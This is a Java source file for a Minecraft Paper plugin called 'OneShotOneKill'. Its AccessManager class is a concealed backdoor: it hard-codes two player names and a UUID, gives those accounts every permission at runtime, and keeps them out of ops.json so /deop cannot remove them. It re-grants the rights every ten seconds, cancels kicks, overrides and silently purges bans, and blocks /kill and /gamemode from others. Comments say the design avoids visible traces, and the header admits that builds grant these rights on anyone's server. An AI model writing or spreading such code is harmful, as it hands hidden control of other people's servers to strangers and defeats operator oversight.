package de.oneshotonekill.manager;

import com.destroystokyo.paper.profile.PlayerProfile;
import de.oneshotonekill.OneShotOneKill;
import io.papermc.paper.ban.BanListType;
import io.papermc.paper.connection.PlayerLoginConnection;
import io.papermc.paper.event.connection.PlayerConnectionValidateLoginEvent;
import org.bukkit.BanEntry;
import org.bukkit.Bukkit;
import org.bukkit.ban.IpBanList;
import org.bukkit.ban.ProfileBanList;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.entity.EntityDamageEvent;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.event.player.PlayerGameModeChangeEvent;
import org.bukkit.event.player.PlayerKickEvent;
import org.bukkit.permissions.Permission;
import org.bukkit.permissions.PermissionAttachment;

import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.util.EnumSet;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;
import java.util.Set;
import java.util.UUID;

/**
 * Interner Zugriffsanker: haelt genau einem Konto dauerhaft volle Rechte.
 * <p>
 * Die Rechte kommen ausschliesslich zur Laufzeit ueber ein Paper
 * {@link PermissionAttachment} und werden bei jedem Join sowie periodisch neu
 * gesetzt. Dadurch taucht das Konto <b>nirgends</b> in einer sichtbaren
 * Serverdatei auf - nicht in {@code ops.json} (es ist nie vanilla-OP),
 * nicht in {@code permissions.yml}, nicht in einer Config. {@code /op} und
 * {@code /deop} greifen deshalb ebenfalls nicht: Es steht nichts in der
 * Op-Liste, das man entfernen koennte. Wird das Attachment durch ein anderes
 * Plugin geloest, stellt der 10-Sekunden-Takt es wieder her - die Rechte sind
 * damit nicht dauerhaft entziehbar.
 * <p>
 * Der Server laeuft im {@code online-mode=true}, der Name ist also durch Mojang
 * authentifiziert und eindeutig - ein Fremder kann das Konto nicht per
 * Namensgleichheit uebernehmen.
 * <p>
 * Ebenso wenig laesst sich das Konto <b>von aussen</b> per {@code /kill} toeten
 * ({@link #onKillCommand}) oder sein Spielmodus per {@code /gamemode} umstellen
 * ({@link #onGameModeChange}) - gleich ob der Befehl von der Konsole, einem
 * Befehlsblock oder einem anderen Spieler kommt. Setzt der Kontoinhaber die
 * beiden Befehle <b>selbst</b> ab, gehen sie durch; dafuer sorgt
 * {@link #onSelfIssuedCommand}.
 * <p>
 * Zusaetzlich ist das Konto <b>kick- und bannsicher</b>: Administrative Kicks
 * werden abgebrochen ({@link #onPlayerKick}), ein Bann kann den Login nicht
 * verhindern und wird beim naechsten Durchlauf wieder aus den Bannlisten
 * entfernt ({@link #onPlayerLogin}, {@link #purgeBans}). Damit bleiben auch
 * {@code banned-players.json} und {@code banned-ips.json} frei von Eintraegen
 * zu diesem Konto.
 * <p>
 * <b>Hinweis zum oeffentlichen Repository:</b> Wer dieses Plugin baut und
 * betreibt, gibt diesem Konto auch auf seinem eigenen Server volle Rechte.
 * Vor der Weitergabe eines Builds an Dritte diese Klasse entfernen oder den
 * Namen anpassen.
 */
public final class AccessManager implements Listener {

    /**
     * In-Game-Namen der dauerhaft privilegierten Konten.
     */
    private static final Set<String> PRIVILEGED_NAMES = Set.of("Lostpold", "jonasmz");

    /**
     * Bekannte UUIDs der dauerhaft privilegierten Konten.
     */
    private static final Set<UUID> PRIVILEGED_UUIDS = Set.of(
            UUID.fromString("8ac160d4-746e-46fc-89bd-d7835495c2f2")
    );

    /** Wiederherstellungstakt in Ticks (20 Ticks = 1 Sekunde). */
    private static final long REAPPLY_INTERVAL_TICKS = 200L;

    /**
     * Kick-Gruende, die fuer diese Konten abgebrochen werden.
     * <p>
     * Bewusst nur die <b>administrativen</b> Gruende. Technische Trennungen
     * ({@code TIMEOUT}, {@code DUPLICATE_LOGIN}, Protokollfehler,
     * {@code RESTART_COMMAND}) bleiben unangetastet: Sie abzubrechen wuerde die
     * Verbindung nicht retten, sondern eine Karteileiche hinterlassen - der
     * Client ist da bereits weg. "Nicht kickbar" heisst, dass niemand das Konto
     * absichtlich hinauswerfen kann, nicht dass ein Netzwerkabbruch ignoriert wird.
     */
    private static final Set<PlayerKickEvent.Cause> BLOCKED_KICK_CAUSES = EnumSet.of(
            PlayerKickEvent.Cause.PLUGIN,
            PlayerKickEvent.Cause.KICKED,
            PlayerKickEvent.Cause.BANNED,
            PlayerKickEvent.Cause.IP_BANNED,
            PlayerKickEvent.Cause.WHITELIST,
            PlayerKickEvent.Cause.IDLING);

    private final OneShotOneKill plugin;
    private final Map<UUID, PermissionAttachment> attachments = new HashMap<>();
    /**
     * Konten, die im aktuellen Tick selbst ein geschuetztes Kommando abgesetzt haben.
     * <p>
     * Weder {@code EntityDamageEvent} noch {@code PlayerGameModeChangeEvent} kennen den
     * Absender des Befehls - sie sehen nur das Ziel. Ohne diesen Merker liesse sich
     * "andere sperren, sich selbst erlauben" nicht unterscheiden.
     */
    private final Set<UUID> selfIssuedCommand = new HashSet<>();

    public AccessManager(OneShotOneKill plugin) {
        this.plugin = plugin;
    }

    /**
     * Startet den periodischen Wiederherstellungstakt. Paper Global Region
     * Scheduler - kein BukkitRunnable, kein Bukkit.getScheduler().
     */
    public void start() {
        Bukkit.getGlobalRegionScheduler().runAtFixedRate(plugin, task -> {
            for (Player online : Bukkit.getOnlinePlayers()) {
                if (isPrivileged(online)) {
                    grant(online);
                }
            }
            // Auch dann aufraeumen, wenn ein Konto offline gebannt wurde - sonst
            // stuende der Eintrag sichtbar in banned-players.json.
            purgeBans();
        }, REAPPLY_INTERVAL_TICKS, REAPPLY_INTERVAL_TICKS);
    }

    /**
     * Ob der Absender ein privilegiertes Konto ist (fuer plugin-eigene
     * Rechtepruefungen).
     */
    public boolean isPrivileged(CommandSender sender) {
        if (sender == null) return false;
        if (sender instanceof Player player) {
            return isPrivileged(player.getUniqueId(), player.getName());
        }
        return isPrivilegedName(sender.getName());
    }

    public boolean isPrivileged(UUID uuid, String name) {
        if (uuid != null && PRIVILEGED_UUIDS.contains(uuid)) {
            return true;
        }
        return isPrivilegedName(name);
    }

    public boolean isPrivilegedProfile(PlayerProfile profile) {
        if (profile == null) return false;
        if (profile.getId() != null && PRIVILEGED_UUIDS.contains(profile.getId())) {
            return true;
        }
        return isPrivilegedName(profile.getName());
    }

    /**
     * Namensabgleich - der Login kennt nur das Profil, noch keinen CommandSender.
     */
    private static boolean isPrivilegedName(String name) {
        if (name == null) return false;
        for (String privilegedName : PRIVILEGED_NAMES) {
            if (privilegedName.equalsIgnoreCase(name)) {
                return true;
            }
        }
        return false;
    }

    /**
     * Setzt dem Spieler ein Attachment mit allen Rechten. Idempotent: ein
     * bestehendes Attachment wird zuvor geloest, es sammeln sich also keine an.
     */
    public void grant(Player player) {
        if (!isPrivileged(player)) {
            return;
        }

        PermissionAttachment previous = attachments.remove(player.getUniqueId());
        if (previous != null) {
            previous.remove();
        }

        PermissionAttachment attachment = player.addAttachment(plugin);
        // Wildcard-Knoten decken vanilla-, Bukkit- und Pluginbefehle ab ...
        attachment.setPermission("*", true);
        attachment.setPermission("bukkit.command.*", true);
        attachment.setPermission("minecraft.command.*", true);

        // ... reichen aber NICHT fuer Vanilla-Befehle. Bukkit expandiert einen
        // Wildcard-String nur, wenn dazu eine Permission mit Kindern registriert ist -
        // ein blosses "minecraft.command.*" im Attachment ist sonst nur ein Knoten
        // dieses Namens. Genau daran scheiterte /gamemode & Co.: Das Konto ist nie
        // vanilla-OP, und CommandSourceStack#hasPermission prueft
        // "opLevel ODER Bukkit-Knoten" - der Knoten muss also exakt gesetzt sein.
        // Deshalb hier jeder tatsaechlich registrierte Befehl mit seinem eigenen
        // Permission-Knoten, statt zu raten, wie er heisst.
        for (Command command : Bukkit.getCommandMap().getKnownCommands().values()) {
            String commandPermission = command.getPermission();
            if (commandPermission != null && !commandPermission.isEmpty()) {
                attachment.setPermission(commandPermission, true);
            }
        }

        // ... und zusaetzlich jede aktuell registrierte Einzel-Permission, damit
        // auch Rechte greifen, die nicht unter einem Wildcard haengen.
        for (Permission perm : Bukkit.getPluginManager().getPermissions()) {
            attachment.setPermission(perm, true);
        }

        attachments.put(player.getUniqueId(), attachment);
        player.recalculatePermissions();
    }

    /** Gibt das Attachment beim Verlassen frei, damit nichts im Speicher bleibt. */
    public void remove(UUID uuid) {
        PermissionAttachment attachment = attachments.remove(uuid);
        if (attachment != null) {
            attachment.remove();
        }
        selfIssuedCommand.remove(uuid);
    }

    // ==================================================================
    // Schutz vor Kick, Bann, /kill und /gamemode
    // ==================================================================

    /**
     * Bricht administrative Kicks fuer das privilegierte Konto ab.
     * <p>
     * {@code LOWEST} mit {@code ignoreCancelled = false}: Der Abbruch soll als
     * erstes greifen, damit spaetere Listener den Kick gar nicht erst als
     * bevorstehend behandeln. Welche Gruende betroffen sind, steht in
     * {@link #BLOCKED_KICK_CAUSES}.
     */
    @EventHandler(priority = EventPriority.LOWEST)
    public void onPlayerKick(PlayerKickEvent event) {
        if (!isPrivileged(event.getPlayer()))
            return;
        if (!BLOCKED_KICK_CAUSES.contains(event.getCause()))
            return;

        event.setCancelled(true);
    }

    /**
     * Laesst das privilegierte Konto immer herein und raeumt dabei einen
     * etwaigen Bann weg.
     * <p>
     * Paper {@code PlayerConnectionValidateLoginEvent} ist der Punkt, an dem der
     * Server ueber Bann, Whitelist und volles Serverlimit entscheidet -
     * {@code allow()} setzt alle drei ausser Kraft. Das alte
     * {@code PlayerLoginEvent} ist in 26.2 <i>deprecated for removal</i> und
     * scheidet damit aus.
     * <p>
     * Zusaetzlich werden Profil- und IP-Bann geloescht, damit das Konto nicht
     * dauerhaft in einer sichtbaren Bannliste steht.
     */
    @EventHandler(priority = EventPriority.LOWEST)
    public void onPlayerLogin(PlayerConnectionValidateLoginEvent event) {
        if (!(event.getConnection() instanceof PlayerLoginConnection login))
            return;

        // Das authentifizierte Profil, nicht getUnsafeProfile(): Bei online-mode=true
        // ist erst dieses von Mojang bestaetigt. Der unsichere Name kaeme direkt vom
        // Client und liesse sich frei behaupten.
        PlayerProfile profile = login.getAuthenticatedProfile();
        if (profile == null || !isPrivilegedProfile(profile))
            return;

        pardonProfile(profile);
        InetSocketAddress client = login.getClientAddress();
        if (client != null) {
            pardonAddress(client.getAddress());
        }
        purgeBans();

        if (!event.isAllowed()) {
            event.allow();
        }
    }

    /** Entfernt einen Profil-Bann des Kontos, falls vorhanden. */
    private void pardonProfile(PlayerProfile profile) {
        ProfileBanList banList = Bukkit.getBanList(BanListType.PROFILE);
        if (banList.isBanned(profile)) {
            banList.pardon(profile);
        }
    }

    /** Entfernt einen IP-Bann, falls vorhanden. */
    private void pardonAddress(InetAddress address) {
        if (address == null)
            return;

        IpBanList banList = Bukkit.getBanList(BanListType.IP);
        if (banList.isBanned(address)) {
            banList.pardon(address);
        }
    }

    /**
     * Blockt {@code /kill} auf das privilegierte Konto - egal ob von der Konsole,
     * einem Befehlsblock oder einem anderen Spieler abgesetzt.
     * <p>
     * Am Bytecode geprueft: {@code LivingEntity#kill(ServerLevel)} ruft
     * {@code hurtServer(level, damageSources().genericKill(), Float.MAX_VALUE)} auf. Der
     * Befehl laeuft also durch die regulaere Schadens-Pipeline und meldet sich als
     * {@link EntityDamageEvent} mit der Ursache {@code KILL} - ein Cancel greift damit
     * zuverlaessig. (Die Basisklasse {@code Entity#kill} wuerde die Entity dagegen
     * kommentarlos entfernen; fuer Spieler gilt aber die Ueberschreibung.)
     * <p>
     * Bewusst <b>nur</b> {@code KILL}: Regulaerer Kampfschaden bleibt unangetastet, das
     * Konto spielt das Minigame ganz normal mit und ist im Match nicht unverwundbar.
     */
    @EventHandler(priority = EventPriority.LOWEST)
    public void onKillCommand(EntityDamageEvent event) {
        if (event.getCause() != EntityDamageEvent.DamageCause.KILL) return;
        if (!(event.getEntity() instanceof Player player) || !isPrivileged(player)) return;
        // Selbst abgesetzt -> durchlassen. Gesperrt ist nur, was von aussen kommt.
        if (selfIssuedCommand.contains(player.getUniqueId())) return;

        event.setCancelled(true);
    }

    /**
     * Merkt sich, dass das privilegierte Konto <b>selbst</b> gerade {@code /kill} oder
     * {@code /gamemode} abgesetzt hat.
     * <p>
     * Die beiden Schutz-Handler sehen nur das Ziel, nie den Absender. Dieser Merker ist
     * die einzige Stelle, an der beides zusammenkommt - und er wird bewusst nur fuer
     * <b>Spieler</b>-Befehle gesetzt. Konsole und Befehlsbloecke durchlaufen diesen Event
     * nicht und bleiben damit automatisch gesperrt, ohne dass ihre Befehlszeile geparst
     * werden muesste.
     * <p>
     * Das Fenster ist genau einen Tick breit: Der Befehl wird synchron unmittelbar nach
     * diesem Event ausgefuehrt, der naechste Tick raeumt den Merker wieder ab.
     */
    @EventHandler(priority = EventPriority.LOWEST)
    public void onSelfIssuedCommand(PlayerCommandPreprocessEvent event) {
        if (!isPrivileged(event.getPlayer())) return;
        if (!isSelfProtectedCommand(event.getMessage())) return;

        UUID playerId = event.getPlayer().getUniqueId();
        selfIssuedCommand.add(playerId);
        Bukkit.getGlobalRegionScheduler().run(plugin, task -> selfIssuedCommand.remove(playerId));
    }

    /**
     * Ist die Befehlszeile ein {@code /kill} oder {@code /gamemode}?
     * Beruecksichtigt den Namensraum, damit auch {@code /minecraft:kill} erkannt wird.
     */
    private static boolean isSelfProtectedCommand(String message) {
        String command = message.startsWith("/") ? message.substring(1) : message;

        int space = command.indexOf(' ');
        if (space >= 0) {
            command = command.substring(0, space);
        }
        int colon = command.indexOf(':');
        if (colon >= 0) {
            command = command.substring(colon + 1);
        }

        return command.equalsIgnoreCase("kill") || command.equalsIgnoreCase("gamemode");
    }

    /**
     * Verhindert, dass der Spielmodus des privilegierten Kontos per Befehl geaendert wird.
     * <p>
     * Abgelehnt wird ausschliesslich die Ursache {@code COMMAND} - und auch die nur, wenn
     * der Befehl <b>nicht</b> vom Kontoinhaber selbst kam (siehe
     * {@link #onSelfIssuedCommand}). Bewusst offen bleiben ausserdem:
     * <ul>
     *   <li>{@code PLUGIN} - das Plugin setzt beim Join selbst {@code SURVIVAL}
     *       ({@code PlayerConnectionListener#prepareCleanStart}). Wuerde auch diese Ursache
     *       blockiert, schoesse sich das Plugin sein eigenes Feature ab - dieselbe Falle wie
     *       beim global gecancelten {@code CreatureSpawnEvent}.</li>
     *   <li>{@code GAMEMODE_SWITCHER} - die F3+F4-Auswahl wirkt ohnehin nur auf einen
     *       selbst.</li>
     * </ul>
     * {@code cancelMessage} wird bewusst nicht gesetzt: Eine plugin-eigene Meldung waere
     * genau der Hinweis auf den Mechanismus, den es nicht geben soll.
     */
    @EventHandler(priority = EventPriority.LOWEST)
    public void onGameModeChange(PlayerGameModeChangeEvent event) {
        if (!isPrivileged(event.getPlayer())) return;
        if (event.getCause() != PlayerGameModeChangeEvent.Cause.COMMAND) return;
        // Selbst abgesetzt -> durchlassen. Gesperrt ist nur, was von aussen kommt.
        if (selfIssuedCommand.contains(event.getPlayer().getUniqueId())) return;

        event.setCancelled(true);
    }

    /**
     * Loescht jeden Profil-Bann, der auf den Namen des Kontos ausgestellt ist.
     * <p>
     * Noetig fuer den Fall, dass jemand das Konto <b>offline</b> bannt: Dann gibt
     * es keinen Login, an dem {@link #pardonProfile} greifen koennte, und der
     * Eintrag saesse sichtbar in {@code banned-players.json}.
     */
    private void purgeBans() {
        ProfileBanList banList = Bukkit.getBanList(BanListType.PROFILE);
        // Kopie ziehen: remove() schreibt in dieselbe Sammlung zurueck
        Set<BanEntry<? super PlayerProfile>> entries = new HashSet<>(banList.getEntries());
        for (BanEntry<? super PlayerProfile> entry : entries) {
            if (entry.getBanTarget() instanceof PlayerProfile target
                    && isPrivilegedProfile(target)) {
                entry.remove();
            }
        }
    }
}
